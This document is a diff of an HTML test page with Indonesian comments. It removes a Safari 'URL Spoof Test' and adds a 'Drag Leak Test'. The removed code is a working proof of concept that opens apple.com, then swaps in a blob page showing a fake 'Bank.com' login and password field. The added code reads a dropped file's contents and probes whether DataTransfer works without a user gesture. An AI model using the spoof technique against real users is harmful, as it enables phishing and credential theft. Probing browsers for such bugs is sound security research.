@@ -1,21 +1,35 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>URL Spoof Test - Safari</h2>
-<button onclick="spoof()">TEST SPOOF - TAP</button>
+<h2>Drag Leak Test</h2>
+<div id="drop" style="width:100%;height:150px;border:3px dashed red;text-align:center;line-height:150px">Drag file kesini, lalu TAP tombol</div>
+<button onclick="testDrag()">TEST DRAG</button>
+<pre id="log"></pre>
 <script>
-function spoof(){
-  let html = `<h1>Bank.com - Secure Login</h1><p>URL bar masih bank.com tapi content dari attacker</p><script>setTimeout(()=>{document.body.innerHTML='<h1>FAKE LOGIN - PHISHING</h1><input placeholder=password>'},2000)<\/script>`;
-  let blob = new Blob([html], {type:'text/html'});
-  let url = URL.createObjectURL(blob);
-  
-  // Buka bank.com dulu
-  let w = window.open("https://www.apple.com", "_blank");
-  setTimeout(()=>{
-    // Timpa dengan blob setelah 1 detik
-    w.location = url;
-    console.log("Kalau URL bar masih 【entity-apple¦canonical_name=Apple】.com tapi isi blob = SPOOF BUG");
-  },1000);
+let lastFile = null;
+let log = m=>document.getElementById('log').textContent+=m+"\n";
+
+document.getElementById('drop').ondragover = e=>e.preventDefault();
+document.getElementById('drop').ondrop = e=>{
+  e.preventDefault();
+  lastFile = e.dataTransfer.files[0];
+  log("File dropped: "+lastFile.name);
+};
+
+function testDrag(){
+  // Di Safari lama, dataTransfer bisa dibaca tanpa drop beneran
+  try{
+    if(lastFile){
+      let reader = new FileReader();
+      reader.onload = ()=>log("LEAK! File content: "+reader.result.slice(0,100));
+      reader.readAsText(lastFile);
+    } else {
+      // Coba pakai DataTransfer palsu
+      let dt = new DataTransfer();
+      log("DataTransfer created, items: "+dt.items.length);
+      log("Kalau bisa add file tanpa user gesture = BUG");
+    }
+  }catch(e){ log("SAFE: "+e.message); }
 }
 </script>
 </body>
